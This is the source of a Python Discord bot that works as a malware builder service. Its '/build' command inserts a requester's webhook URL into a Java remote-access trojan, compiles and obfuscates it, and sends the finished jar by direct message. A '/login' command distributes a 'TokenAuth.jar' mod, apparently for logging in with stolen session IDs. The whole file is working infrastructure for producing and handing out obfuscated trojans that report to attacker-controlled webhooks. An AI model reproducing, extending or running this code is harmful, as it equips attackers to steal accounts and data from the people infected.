import os, discord, json, checkwebhook, datetime
from discord.ext import commands

builtfiles = []
cwd = os.getcwd()
data = open("config.json")
config = json.load(data)
token = config["config"]["token"]
client = commands.Bot()
path = config["config"]["path"]
exportname = config["config"]["exportname"]
line = 38 - 1
stringname = config["config"]["stringname"]
obfuscatedfilename = config["config"]["exportname"]+ ".jar" + "-out.jar"
ratpath = f"{cwd}/rat/src/main/java/{path}"

invalidwebhookembed = discord.Embed(title="You added an invalid webhook ☹️", description='Your webhook responded with an error code. Try creating a new one!', color=0xFFFFFF)
successembed = discord.Embed(title="Success! 🎉", description="Your RAT has been built successfully.", color=0xFFFFFF)
buildingembed = discord.Embed(description=f"`✅` Your file is being built. Please wait about 25 seconds...", color=0xFFFFFF)
invalidwebhookembed.add_field(name="If you believe this is false", value="message a staff member.")
successembed.add_field(name="A file has been sent to your direct messages!", value="If you did not recieve one, make sure you can recieve dms from members in your servers.")
successembed.set_footer(text="Thank you! Made by Gute Nacht")
loginsuccess = discord.Embed(title="Success! 🎉", description=f"**A file has been sent to your direct messages!**\nIf you did not recieve one, make sure you can recieve dms from members in your servers.", color=0xFFFFFF)

@client.event
async def on_ready():
    print("Logged in as " + client.user.name)

@client.slash_command(name="build", description="Builds a RAT for you")
@commands.cooldown(1, 60, commands.BucketType.user)
async def build(ctx, *, webhook=None):
    if webhook == None or checkwebhook.validatewebhook(webhook) == False:
        await ctx.respond(embed=invalidwebhookembed, ephemeral=True)
        return

    file = open(ratpath, "r")
    list_of_lines = file.readlines()
    list_of_lines[line] = f'        String {stringname} = "{webhook}";\n'
    file = open(ratpath, "w")
    file.writelines(list_of_lines)
    file.close()

    await ctx.respond(embed=buildingembed, ephemeral=True)

    os.chdir(f"{cwd}/rat")
    os.system("gradlew build")
    os.chdir(cwd)
    os.system("python obfuscate.py")
    print("Obfuscated")

    member = ctx.author
    await member.create_dm()
    await member.dm_channel.send(file=discord.File(f"{cwd}/rat/build/libs/{obfuscatedfilename}"))

    await ctx.respond(embed=successembed, ephemeral=True)

    os.system("cls")
    now = datetime.datetime.now()
    dt_string = now.strftime("%D %H:%M:%S")
    builtfiles.append(f"Built file for {ctx.author}/{ctx.author.id} at {dt_string}")
    print(*builtfiles, sep='\n')

@build.error
async def command_name_error(ctx, error):
    if isinstance(error, commands.CommandOnCooldown):
        await ctx.respond(f"You can only run this command every 60 seconds! Try again in {error.retry_after:.2f} seconds", ephemeral=True)

@client.slash_command(name="login", description="Mod to log in with session IDS")
async def login(ctx):
    await ctx.respond(embed=loginsuccess, ephemeral=True)
    member = ctx.author
    await member.create_dm()
    await member.dm_channel.send(file=discord.File(f"{cwd}/loginmod/TokenAuth.jar"))

client.run(token)